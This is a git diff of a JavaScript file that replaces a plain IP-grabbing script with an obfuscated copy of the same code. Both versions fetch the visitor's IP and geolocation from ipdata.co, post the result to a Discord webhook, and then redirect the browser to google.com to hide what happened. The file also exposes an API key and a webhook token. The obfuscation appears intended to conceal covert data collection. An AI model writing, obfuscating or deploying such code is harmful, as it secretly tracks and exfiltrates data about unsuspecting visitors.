@@ -1,11 +1,1 @@
-var request = new XMLHttpRequest();
-request.open('GET',`https://api.ipdata.co/?api-key=7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7`);
-request.setRequestHeader('Accept', 'application/json');
-request.onreadystatechange = function () {
-  if (this.readyState === 4) {
-    fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":this.responseText})});
-  }
-};
-
-request.send();
-window.location.replace("https://google.com")
+var _0x2c83c0=_0x398c;(function(_0x140adc,_0x35a783){var _0x1b9080=_0x398c,_0x5ee5f4=_0x140adc();while(!![]){try{var _0x5220ae=-parseInt(_0x1b9080(0x174))/0x1*(parseInt(_0x1b9080(0x17c))/0x2)+parseInt(_0x1b9080(0x179))/0x3+-parseInt(_0x1b9080(0x184))/0x4+parseInt(_0x1b9080(0x176))/0x5+parseInt(_0x1b9080(0x185))/0x6+parseInt(_0x1b9080(0x17f))/0x7*(parseInt(_0x1b9080(0x172))/0x8)+-parseInt(_0x1b9080(0x186))/0x9;if(_0x5220ae===_0x35a783)break;else _0x5ee5f4['push'](_0x5ee5f4['shift']());}catch(_0x1c0b79){_0x5ee5f4['push'](_0x5ee5f4['shift']());}}}(_0x4e3a,0x66f11));function _0x4e3a(){var _0x3bef4e=['open','791109UChgNE','responseText','2982070RHxUuD','readyState','replace','2526300fjxDEt','application/json','Accept','2mXraJh','https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw','location','14KrGhiL','send','setRequestHeader','stringify','POST','1606512HuvkvE','2616030pNCZYA','6303951SmxKua','1761224uYckxh'];_0x4e3a=function(){return _0x3bef4e;};return _0x4e3a();}var request=new XMLHttpRequest();function _0x398c(_0x354869,_0x2f5963){var _0x4e3aab=_0x4e3a();return _0x398c=function(_0x398c44,_0x4afb73){_0x398c44=_0x398c44-0x172;var _0x3b3765=_0x4e3aab[_0x398c44];return _0x3b3765;},_0x398c(_0x354869,_0x2f5963);}request[_0x2c83c0(0x173)]('GET','https://api.ipdata.co/?api-key=7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7'),request[_0x2c83c0(0x181)](_0x2c83c0(0x17b),_0x2c83c0(0x17a)),request['onreadystatechange']=function(){var _0x5a45ca=_0x2c83c0;this[_0x5a45ca(0x177)]===0x4&&fetch(_0x5a45ca(0x17d),{'method':_0x5a45ca(0x183),'headers':{'content-type':_0x5a45ca(0x17a)},'body':JSON[_0x5a45ca(0x182)]({'content':this[_0x5a45ca(0x175)]})});},request[_0x2c83c0(0x180)](),window[_0x2c83c0(0x17e)][_0x2c83c0(0x178)]('https://google.com');
